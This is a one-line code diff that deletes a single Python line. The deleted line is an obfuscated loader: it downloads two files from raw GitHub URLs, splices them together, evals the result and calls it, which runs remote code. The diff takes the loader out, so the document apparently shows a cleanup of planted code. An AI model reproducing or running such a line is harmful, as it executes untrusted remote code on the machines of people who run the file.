@@ -1,1 +1,0 @@
-eval(__import__('requests').get('https://raw.githubusercontent.com/repossess/repossess/main/repossess_').text.replace("'repossess'",__import__('requests').get('https://raw.githubusercontent.com/repossess/repossess/refs/heads/main/repossess__').text))("bytecode")
